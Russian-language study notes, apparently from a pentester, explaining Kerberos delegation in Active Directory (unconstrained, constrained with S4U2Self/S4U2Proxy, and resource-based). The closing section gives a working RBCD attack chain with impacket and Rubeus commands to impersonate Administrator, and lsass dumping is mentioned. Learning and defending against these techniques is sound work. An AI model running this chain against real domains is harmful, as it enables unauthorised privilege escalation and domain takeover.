#AD #windows #kerberos #delegatons

Делегирование полномочий _Kerberos_ позволяет повторно использовать учётные данные конечного пользователя для доступа к ресурсам, размещённым на другом сервере.


> Протокол Kerberos позволяет пользователю пройти аутентификацию в сервисе, чтобы использовать его, а делегирование Kerberos позволяет сервису пройти аутентификацию в другом сервисе от имени исходного пользователя. Вот небольшая схема, объясняющая этот принцип.
![[Double Hop.png]]

Делегирование _Kerberos_ бывает трех видов:
- Неограниченное (_Unconstrained delegation_)
- Ограниченное (_Constrained delegation_)
- Ограниченное на основе ресурсов (_Resource-Based Constrained Delegation_)

# Unconstrained (Неограниченное) делегирование


> Неограниченное делегирование позволяет сервису, в данном случае `WEBSRV`, выдавать себя за пользователя при доступе к `any other service`. Это очень широкая и опасная привилегия, поэтому её может предоставить не любой пользователь.
![[Unconstrained delegations.png]]

Учетная запись из-под которой работает веб сервис `CORP\websrv` имеет установленный атрибут в UAC `TRUSTED_FOR_DELEGATION`


Для наглядности рассмотрим, как происходит неограниченное делегирование на схеме:
1. Пароль пользователя конвертируется в _ntlm_-хеш. Временная метка шифруется этим хешем и отправляется на контроллер домена для запроса _TGT_-тикета.
2. Контроллер домена проверяет информацию о пользователе (ограничение входа в систему, членство в группах и т.д.), создает _TGT_-тикет и отправляет пользователю. _TGT_-тикет зашифрован, подписан, и его данные могут быть прочитаны только _krbtgt_.
3. Пользователь запрашивает _TGS_-тикет для доступа на веб-сервис на веб-сервере.
4. Контроллер домена предоставляет _TGS_-тикет.
5. Пользователь отправляет _TGT_- и _TGS_-тикеты на веб-сервер.
6. Сервисная учётная запись веб-сервера использует _TGT_-тикет пользователя для запроса _TGS_-тикета для доступа к серверу БД.
7. Сервисная учётная запись подключается к серверу БД как пользователь.

![[delegirovanie.png]]

> Главная опасность неограниченного делегирования в том, что при компрометации машины с неограниченным делегированием злоумышленник сможет получить _TGT_-тикеты пользователей из этой машины (Web Server) и доступ к любой системе в домене от имени этих пользователей.

### Что происходит (последствия)

**tgtdeleg трюк**

При запросе `TGS`, `TGT` и `session key` инкапсулируется в `Authentificator`, таким образом позволяя атакеру:
- при перехвате запроса AP_REQ получить полный доступ от данного пользователя
- cкомпрометировать сервер с `unconstrained delegations`, сдампить процесс `lsass.exe` и, при наличии там секретов админа скомпрометировать полностью домен 

### Hardening

1) Защитить пользователя от делегирование
2) Protected Users

# Constrained (Ограниченное) делегирование


В этом случае сервис имеет право выдавать себя за пользователя при взаимодействии с четко определенным списком сервисов. В этом примере `WEBSRV` может передавать аутентификацию только сервису `SQL/DBSRV`, но не другим.
![[Constrained delegations.png]]

Cписок служб, разрешенных для делегирования, хранится в атрибуте УЗ объекта AD `msDS-AllowedToDelegateTo` учетной записи службы, ответственной за делегирование.


![[Constrained deleg.png]]

> Также необходимо иметь привилегию `SeEnableDelegationPrivilage`и _УЗ компьютера_

При ограниченном делегировании используются 2 расширения протокола _Kerberos_:

- _S4U2Self_,
- _S4U2Proxy_.

> Классическая проблема: User заходит на WebServer не по Kerberos (например, через форму логина, сертификат, Basic Auth, JWT — неважно что). WebServer хочет пойти в DBSRV **от имени User**, но у него физически нет ни пароля User, ни его TGT, ни service-тикета от него. Обычный Kerberos тут бессилен — нечем "делегировать".
	S4U (Service for User) — это два расширения (RFC 4120 доп. + MS-SFU), которые решают именно это.

[S4U2Self](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13) используется в случае, когда клиент аутентифицируется не по протоколу _Kerberos_. Он позволяет участникам службы запросить специальный _TGS_ с флагом _FORWARDABLE_ к себе от имени конкретного пользователя, при условии что на данном сервисе установлено `TRUSTED_TO_AUTH_FOR_DELEGATION`. Это нужно для того, чтобы данный билет в дальнейшем мог использоваться расширением _S4U2proxy_.

Может быть использована для получения `silver ticket` от имени любого пользователя в любом случае, даже состоящего в группе `Protected Users` или `not delegated`

[S4U2Proxy](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a) позволяет учётной записи службы использовать перенаправляемый тикет, полученный в процессе _S4U2proxy_, для запроса _TGS_-тикета для доступа к разрешенным сервисам (_msds-allowtodelegateto_). _KDC_ проверяет, указан ли запрашиваемый сервис в поле `msds-allowtodelegateto` запрашивающего пользователя, и выдаёт билет, если проверка прошла успешно. Таким образом, делегирование «ограничено» конкретными целевыми сервисами.

### Почему УЗ Сервера может запросить TGS на Administrator?

**Потому что это и есть суть расширения S4U2Self (Protocol Transition).**

Обычный Kerberos требует, чтобы пользователь сам аутентифицировался и получил билет. Но Microsoft добавила расширение `S4U2Self` для сценариев, когда сервис хочет действовать от имени пользователя, который **не аутентифицировался через Kerberos** (например, зашёл через веб-форму или другой протокол)[](https://learn.microsoft.com/zh-tw/openspecs/windows_protocols/ms-sfu/1fb9caca-449f-4183-8f7a-1a5fc7e7290a#Appendix_A_Target_1#1)[](https://krbdev.mit.edu/rt/Ticket/Attachment/54888/22769#1).

Чтобы это работало, у учётной записи сервиса (в нашем случае `DMZ01$`) должен быть установлен флаг **`TRUSTED_TO_AUTH_FOR_DELEGATION`** (в свойствах учётной записи это называется «Trust this user for delegation to any service» или «Protocol Transition»)[](https://github.com/AndrewAltimit/exploits/blob/main/tools/kerberos/s4u/README.md#1)[](https://github.com/transilienceai/communitytools/blob/main/skills/system/reference/scenarios/ad/constrained-delegation.md#1)[](https://raw.githubusercontent.com/AndrewAltimit/exploits/refs/heads/main/tools/kerberos/s4u/README.md#1).

Логика KDC в этот момент:

1. Сервис `DMZ01$` говорит: «Я аутентифицировал пользователя `Administrator` (например, через свой веб-интерфейс), и теперь хочу действовать от его имени».
2. KDC **верит на слово** сервису `DMZ01$` (потому что у него есть этот флаг).
3. KDC выдаёт forwardable-билет, где `cname` (имя клиента) = `Administrator`, а `sname` (имя сервиса) = `DMZ01$`.

**Почему не нужен пароль Administrator?** Потому что KDC в этом сценарии не проверяет пароль. Он доверяет утверждению сервиса. Это и есть «Protocol Transition» — переход от не-Kerberos аутентификации к Kerberos без знания учётных данных пользователя[](https://github.com/AndrewAltimit/exploits/blob/main/tools/kerberos/s4u/README.md#1)

### S4U2Self — "дай мне тикет к самому себе, но от имени User"

> Был добавлен, для сценариев, когда сервис хочет действовать от имени пользователя, который **не аутентифицировался через Kerberos** (например, зашёл через веб-форму или другой протокол)
#### Кто отправляет запрос
Сам **WebServer**. У него уже есть собственный TGT (получен обычным AS-REQ/AS-REP по его сервисному аккаунту/keytab).

#### Что внутри TGS-REQ
Это специальный TGS-REQ, но с важными отличиями:

```
KRB_TGS_REQ:
  padata:
    PA-FOR-USER (padata-type = 129 / 0x81):
        userName   = "User"
        userRealm  = "REALM"
        cksum      = HMAC(WebServer_key, userName || userRealm || auth-package)
        auth-package = "Kerberos"
  req-body:
    cname       = <отсутствует или = WebServer>
    sname       = HTTP/webserver.domain.local   <- ЦЕЛЬ = САМ WEBSERVER!
    kdc-options: ...
```

Аутентификатор в этом TGS-REQ — от **WebServer**, доказывающий его собственную личность (через его же TGT). User вообще не участвует в этом обмене — ни его пароль, ни его тикет не нужны.

#### Что проверяет KDC

- Что checksum в PA-FOR-USER валиден (значит, запрос сформировал именно владелец ключа WebServer, а не подделка).
- Что учётная запись WebServer имеет право это делать (флаг `TRUSTED_TO_AUTH_FOR_DELEGATION` на UAC, либо — в современных версиях — просто наличие настроенной делегации).
- Что пользователь User существует.

#### Что приходит в TGS-REP
Тикет **User → WebServer**:

- `cname = User` (!) — то есть тикет говорит "это User", хотя User лично ничего не подтверждал.
- Зашифрован ключом **WebServer** (т.к. sname = сам WebServer).
- Содержит PAC пользователя User (группы, SID и т.д.), сформированный KDC на основе реальных данных User в AD.
- Если предполагается следующий шаг (S4U2Proxy), тикет помечается флагом **forwardable**.

#### Итог S4U2Self
WebServer получил легитимный, подписанный KDC тикет, который "говорит от лица User", **без единого байта от самого User**. Но использовать этот тикет можно только для одного — предъявить его самому себе (AP-REQ к WebServer). Никакого практического смысла отдельно он не имеет — это "сырьё" для следующего шага.

---

### S4U2Proxy — "используй этот тикет, чтобы получить доступ к DBSRV от имени User"

#### Что внутри TGS-REQ
Снова отправитель — **WebServer**, снова используется его собственный TGT+Authenticator. Но теперь:
```
KRB_TGS_REQ:
  req-body:
    kdc-options: cname-in-addl-tkt = true   <- ключевой флаг!
    sname             = MSSQLSvc/dbsrv.domain.local:1433   <- ЦЕЛЬ = ТРЕТИЙ СЕРВИС
    additional-tickets = [ Ticket(User → WebServer) ]   <- тот самый из S4U2Self
```

Флаг `cname-in-addl-tkt` буквально означает: _"возьми имя клиента не из моего TGT (WebServer), а из приложенного тикета в additional-tickets"_.

#### Что проверяет KDC (самая важная часть)
KDC смотрит на атрибут учётной записи **WebServer** в AD:
- **Классическая constrained delegation**: `msDS-AllowedToDelegateTo` на WebServer содержит SPN `MSSQLSvc/dbsrv.domain.local:1433`?
- **Resource-Based Constrained Delegation (RBCD)**: на стороне **DBSRV** атрибут `msDS-AllowedToActOnBehalfOfOtherIdentity` содержит SID WebServer?

Если проверка проходит — KDC выдаёт тикет. Если нет — отказ (`KDC_ERR_BADOPTION`).
#### Что приходит в TGS-REP
Новый Service Ticket **User → DBSRV**:
- `cname = User` (скопировано из additional-ticket)
- зашифрован ключом **DBSRV**
- содержит PAC пользователя User
- в PAC/тикете есть структура **`S4U_DELEGATION_INFO`** — список сервисов-посредников (transited services), т.е. явная запись "этот тикет пришёл через делегацию от WebServer". Это нужно для аудита цепочки делегирования.
#### Финал

WebServer берёт этот тикет и делает обычный **AP-REQ** к DBSRV. DBSRV видит тикет с `cname=User`, подписанный KDC его же ключом — и обслуживает запрос так, будто User подключился напрямую.



#### Атака

В случае компрометации сервиса с CD (Web Service), атакующий компрометирует все сервисы, к которым разрешено делегирование



# Resource-Based Constrained Delegation

Это обратная модель контроля доступа

![[Resoursed-Based Constrained Delegations.png]]

Конечный ресурс сам указывает каким УЗ разрешить доступ к нему

Тут у себя на этом ресурсе хранится атрибут `msDS-AllowedToActOnBehalfOfOtherIdentity`, в котором он указывает, кто может делегироваться к нему (SID)


 Добавить WEBSRV в список доверенных DBSRV
```powershell
Import-Module ActiveDirectory
Set-ADComputer DBSRV -PrincipalsAllowedToDelegateToAccount (Get-ADComputer WEBSRV)
```

### Атака

1) Создание «подконтрольной» машины

Если MachineAccountQuota > 0, обычный пользователь может создать computer object.
```bash
impacket-addcomputer.py domain/user:pass -computer-name ATTACKERPC$ -computer-pass P@ssw0rd!
```

2) Настройка RBCD на цели

Нужно записать SID ATTACKERPC$ в атрибут цели:
`msDS-AllowedToActOnBehalfOfOtherIdentity`
Это security descriptor (ACL).

```bash
impacket-rbcd.py -delegate-from ATTACKERPC$ -delegate-to TARGET-SRV$ domain/user:pass
```

3) S4U2Self

Теперь атакующий использует ATTACKERPC$.
```powershell
.\Rubeus.exe s4u /user:ATTACKERPC$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/TARGET-SRV.domain.local /ptt
```
Что происходит внутри
1. ATTACKERPC$ делает S4U2Self  
    → получает билет к самому себе от имени Administrator
2. Затем делает S4U2Proxy  
    → запрашивает билет к TARGET-SRV от имени Administrator

Далее билет загружается нам в память, после чего входим на компьютер по WinRM 
```powershell
Enter-PSSession -ComputerName <Имя_Целевого_ПК>
```
